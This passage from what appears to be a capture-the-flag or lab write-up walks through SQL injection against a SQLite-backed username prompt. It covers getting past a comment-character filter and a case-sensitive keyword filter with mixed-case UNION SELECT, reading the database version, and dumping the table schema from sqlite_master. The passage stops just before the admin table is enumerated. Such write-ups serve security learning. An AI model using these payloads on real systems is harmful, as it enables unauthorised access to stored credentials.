Then we can test with others **SQLi**:

````sql
' OR 1=1 --+
````
**Output:**
````sql
Please enter your username: ' OR 1=1 --+
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
````

The application blocks certain characters and patterns:
| Filter | Meaning |
| :--- | :--- |
| `--` | SQL single-line comment |
| `/*` | SQL block-comment opening |
| `%0b` | Encoded vertical tab |

Now in this we need to work without these blocked patterns.

````sql
' OR '1'='1
````
**Output:**
````sql
Please enter your username: ' OR '1'='1
Password: tF8tj2o94WE4LKC
````

In this it show password, but not correct on lab. This happens because the injected condition evaluates to true.

````sql
' UniOn SeLeCt 1 '
````
**Output:**
````sql
Please enter your username: ' UniOn SeLeCt 1 '
Password: 1
````

In this it show `1` cause we use `UNION SELECT`.

> ``UNION SELECT`` allows us to combine results from another SQL query with the original query.

> The application uses a case-sensitive keyword filter, while SQLite understands SQL keywords regardless of capitalization.



Then test identify the database version:
````sql
' unIOn seLECt sqlite_version() '
````
**Output:**
````sql
Please enter your username: ' unIOn seLECt sqlite_version() '
Password: 3.31.1
````

In this it show version `3.31.1`.

> ``sqlite_version()`` is a built-in SQLite function.


Then I test to discover database tables

SQLite maintains database structure information in: `sqlite_master`.

This it normal as system table stores information about database objects, including their creation SQL.

````sql
' UNioN SElecT group_concat(sql) FROM sqlite_master '
````
**Output:**
````sql
Please enter your username: ' UNioN SElecT group_concat(sql) FROM sqlite_master '
Password: CREATE TABLE usertable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER),CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
````

We have discovered two important tables.
| Table | Purpose |
| :--- | :--- |
| `usertable` | Normal user information |
| `admintable` | Administrator-related information |


Then enumerate `admintable`:
